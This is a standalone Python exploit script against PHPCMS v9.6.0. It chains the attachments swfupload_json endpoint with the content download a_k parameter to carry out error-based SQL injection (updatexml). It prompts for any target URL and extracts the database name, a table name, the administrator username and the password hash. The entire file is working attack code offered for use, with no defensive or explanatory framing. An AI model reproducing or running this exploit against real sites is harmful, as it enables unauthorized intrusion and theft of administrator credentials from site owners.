import requests
import time
import re
import sys
 
def banner():
    msg = '''--------------EXP IS PHPCMS V9.6.0---------------'''
    print(msg)
def get_encrypt_value(payload,url):
    url_com = url + payload
    url_1 = "{}/index.php?m=wap&a=index&siteid=1".format(url)
    cookies = requests.get(url_1).cookies
    for c in cookies:
        if c.name[-7:]=='_siteid':
            cookie_head=c.name[:6]
            cookies[cookie_head + '_userid']=c.value
            cookies[c.name]=c.value
            break
    encrypt_cookie = requests.get(url_com,cookies=cookies).cookies
    for c in encrypt_cookie:
        if c.name[-9:] == '_att_json':
            encrypt_data = c.value
            break
    return get_data(url,encrypt_data)
def get_data(url,data):
    url = "{}/index.php?m=content&c=down&a_k={}".format(url,data)
    rsp = requests.get(url)
    cc = re.findall(r"XPATH syntax error: '~(.*?)~' <br />",rsp.text)
    return cc
def get_payload(url):
    data = []
    try:
        payload_db_name = {"db_name":"/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=1%*27%*20and%*20updatexml%281%2Cconcat%280x7e%2C%28select%*20database%28%29%29%2C0x7e%29%2C1%29%23%26m%3D1%26modelid%3D1%26f%3D1%26catid%3D1"}
        db_name = get_encrypt_value(payload_db_name.get('db_name'),url)
        db_name = db_name[0]
        data.append(db_name)
    except:
        str = "***"
        data.append(str)
    try:
        payload_table_name = {"table_name":"/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=1%*27%*20and%*20updatexml%281%2Cconcat%280x7e%2C%28select%*20table_name%*20from%*20information_schema.tables%*20where%*20table_schema%3D%*27"+db_name+"%*27%*20limit%*200%2C1%29%2C0x7e%29%2C1%29%23%26m%3D1%26modelid%3D1%26f%3D1%26catid%3D1"}
        table_name = get_encrypt_value(payload_table_name.get('table_name'),url)
        table_name = table_name[0]
        data.append(table_name)
    except:
        str = "***"
        data.append(str)
    try:
        payload_admin_name = {"admin_name":"/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=1%*27%*20and%*20updatexml%281%2Cconcat%280x7e%2C%28select%*20mid%28%28SELECT%*20username%*20from%*20"+table_name+"%*20limit%*200%2C1%29%2C1%2C16%29%29%2C0x7e%29%2C1%29%23%26m%3D1%26modelid%3D1%26f%3D1%26catid%3D1"}
        admin_name = get_encrypt_value(payload_admin_name.get('admin_name'),url)
        admin_name = admin_name[0]
        data.append(admin_name)
    except:
        str = "***"
        data.append(str)
    try:
        payload_pass_s16 = {"pass_s16":"/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=1%*27%*20and%*20updatexml%281%2Cconcat%280x7e%2C%28select%*20mid%28%28SELECT%*20password%*20from%*20"+table_name+"%*20limit%*200%2C1%29%2C1%2C16%29%29%2C0x7e%29%2C1%29%23%26m%3D1%26modelid%3D1%26f%3D1%26catid%3D1"}
        pass_s16 = get_encrypt_value(payload_pass_s16.get('pass_s16'),url)
        pass_s16 = pass_s16[0]
    except:
        pass
    try:
        payload_pass_x16 = {"pass_x16":"/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=1%*27%*20and%*20updatexml%281%2Cconcat%280x7e%2C%28select%*20mid%28%28SELECT%*20password%*20from%*20"+table_name+"%*20limit%*200%2C1%29%2C16%2C20%29%29%2C0x7e%29%2C1%29%23%26m%3D1%26modelid%3D1%26f%3D1%26catid%3D1"}
        pass_x16 = get_encrypt_value(payload_pass_x16.get('pass_x16'),url)
        pass_x16 = pass_x16[0]
        password = pass_s16 + pass_x16
        data.append(password)
    except:
        str = "***"
        data.append(str)
    output_data(data)
def output_data(data):
    output = '''
        database name is : {0}
        table name is : {1}
        admin username is : {2}
        admin password is : {3}
    '''.format(data[0],data[1],data[2],data[3])
    print(output)
def get_url():
    url = input("Please input url:")
    if ("http://"in url) or ("https://" is url):
        return url
    else:
        print("Warning: Please input http:// or https:// ! try again !")
def main():
    banner()
    url = get_url()
    print("[*] target:{}".format(url))
    get_payload(url)
    print("[*] shutting down at {0}".format(time.strftime("%X")))
if __name__ == '__main__':
    main()